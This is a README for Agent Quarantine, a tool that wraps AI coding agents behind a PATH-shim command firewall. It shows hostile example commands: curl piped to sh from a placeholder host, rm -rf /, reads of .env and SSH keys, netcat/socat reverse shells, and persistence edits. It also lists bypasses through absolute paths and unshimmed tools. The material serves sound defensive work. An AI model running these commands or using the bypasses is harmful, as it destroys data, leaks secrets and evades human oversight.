# Agent Quarantine

[![CI](https://github.com/spacegiyou/agent-quarantine/actions/workflows/ci.yml/badge.svg)](https://github.com/spacegiyou/agent-quarantine/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/spacegiyou/agent-quarantine?label=release)](https://github.com/spacegiyou/agent-quarantine/releases)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](#license)

**A local command firewall and safety layer for AI coding agents.**

Agent Quarantine is not a sandbox. It is a command firewall and audit layer for
AI coding agents: not a VM, not kernel isolation, but a practical safety belt
for the commands agents commonly launch.

Agent Quarantine (`agent-quarantine`, alias `aq`) wraps an AI coding agent —
Codex, Claude Code, Cline, Cursor agents, Gemini CLI, Aider, Continue — so that
the shell commands it launches are **observed, dangerous ones are blocked, risky
ones require your approval, and everything is written to a readable audit log**.
See [Limitations](docs/limitations.md).

If this project helps you run AI coding agents more safely, consider starring
the repo so other developers can find it.

## Watch the 71-second demo

[![Agent Quarantine demo video](assets/demo/thumbnail.png)](assets/demo/agent-quarantine-demo-en.mp4)

The demo shows Agent Quarantine blocking `curl | sh`, blocking a sensitive
`.env` search, scanning a risky repo with `preflight`, and generating a Markdown
audit report. English subtitles are available as
[SRT](assets/demo/agent-quarantine-demo.en.srt).

---

## The 20-second demo

```text
$ aq run -- sh -c "curl https://example.invalid/install.sh | sh"

Agent Quarantine blocked a command.

  sh -c curl https://example.invalid/install.sh | sh

Why:
  - downloads code from the network and immediately executes it in a shell

Safer:
  - download the script to a file, read it, then run only the reviewed local copy

Rule: remote-script-piped-to-shell
```

The command exits `126` and never runs. Meanwhile a read-only command the agent
runs (say `git status`) is allowed and logged, and a plain `curl` is paused for
approval (or denied automatically when there is no terminal).

## Install from source

Requires a stable Rust toolchain (1.74+).

```bash
git clone https://github.com/spacegiyou/agent-quarantine
cd agent-quarantine
cargo install --path crates/agent-quarantine-cli
# optional short alias
alias aq=agent-quarantine
```

## Quickstart

```bash
# 1. Look at a repo before letting an agent touch it.
aq preflight .

# 2. Run your agent behind the firewall.
aq run -- codex          # or: claude, aider, cursor-agent, ...

# 3. Read back what happened.
aq report .agent-quarantine/sessions/<session-id>.jsonl
```

Create a policy you can edit:

```bash
aq policy init            # writes agent-quarantine.yaml
aq policy show            # prints the effective policy
```

## What it blocks (by default)

| Rule | Example |
|------|---------|
| `remote-script-piped-to-shell` | `curl … \| sh` |
| `destructive-root-removal` | `rm -rf /`, `rm -rf ~` |
| `credential-file-read` | `cat .env`, `cp ~/.ssh/id_rsa …` |
| `git-force-push` | `git push --force` |
| `reverse-shell-pattern` | netcat/socat interactive shells over the network |
| `docker-privileged-host-mount` | `docker run --privileged`, host-socket mounts |
| `persistence-mechanism` | crontab, launch agents, shell-startup edits |

**Asks first:** shell `-c` scripts, network tools, package installs, DNS TXT
lookups, `docker run`, `chmod`/`chown`/`sudo`, base64-decode-to-exec.

**Allows (still logged):** `git status`/`diff`/`log`, `ls`, `pwd`, `cat` (on
non-sensitive files), `grep`/`rg`, and similar read-only inspection.
Searches or dumps of sensitive files, such as `grep API_KEY .env`,
`rg SECRET .env`, or `dd if=.env of=/tmp/x`, are blocked.

Anything unrecognized defaults to **ask** (fail-closed).

## Shim coverage in v0.1

Agent Quarantine intercepts common agent-launched commands by putting shims at
the front of `PATH`.

| Category | Commands |
|----------|----------|
| Shells and runtimes | `sh`, `bash`, `zsh`, `python`, `python3`, `node`, `perl`, `ruby`, `php` |
| Package/build tools | `npm`, `npx`, `pnpm`, `yarn`, `bun`, `pip`, `pip3`, `uv`, `cargo`, `go`, `make` |
| Network and remotes | `curl`, `wget`, `git`, `ssh`, `scp`, `rsync`, `nc`, `ncat`, `socat`, `dig`, `nslookup` |
| Wrappers and privilege | `env`, `sudo`, `doas`, `xargs`, `timeout`, `nohup`, `setsid`, `script`, `chmod`, `chown` |
| Archives/encoding/system | `base64`, `openssl`, `tar`, `zip`, `crontab`, `launchctl`, `systemctl`, `awk`, `sed` |
| Filesystem inspection/mutation | `rm`, `cat`, `cp`, `mv`, `ls`, `pwd`, `grep`, `rg`, `find`, `head`, `tail`, `less`, `more`, `tee`, `touch`, `mkdir`, `ln`, `dd` |

This list is intentionally visible: anything run by absolute path, or a command
outside the shim list, may bypass v0.1 enforcement.

## What it does *not* block

Agent Quarantine cannot stop everything. It is a PATH-shim firewall, so:

- absolute-path binaries (`/usr/bin/curl …`) bypass the shims;
- already-running processes are outside the boundary;
- an *allowed* binary can still do arbitrary file and network I/O;
- it is not a VM, kernel sandbox, EDR, or malware detector.

It is useful because it blocks the common, dangerous, agent-triggered commands
and gives you visibility. Read the full [threat model](docs/threat-model.md) and
[limitations](docs/limitations.md) before relying on it.

## How it works

`aq run` creates a session, drops a directory of shims (symlinks back to the
`agent-quarantine` binary) for common tools, and prepends it to `PATH`. When the
wrapped agent — or anything it spawns — calls `curl`, `git`, `sh`, etc., the shim
classifies the command with a deterministic rule engine, applies your policy
(allow / ask / block), logs a JSONL event, and only then runs the real tool.
See [architecture](docs/architecture.md).

## Documentation

- [Threat model](docs/threat-model.md)
- [Limitations](docs/limitations.md)
- [Policy reference](docs/policy.md)
- [Architecture](docs/architecture.md)
- [Security policy](SECURITY.md)

## Contributing

Issues and PRs welcome. Please keep the project honest: **no real malware,
working reverse shells, destructive demo scripts, or real secrets** in issues,
tests, or fixtures. Use the harmless [`examples/safe-risky-repo`](examples/safe-risky-repo)
pattern for anything that needs to trip a detector.

Before opening a PR:

```bash
cargo fmt --check
cargo clippy --all-targets --all-features -- -D warnings
cargo test
```

## License

Dual-licensed under either of [MIT](LICENSE-MIT) or [Apache-2.0](LICENSE-APACHE),
at your option.
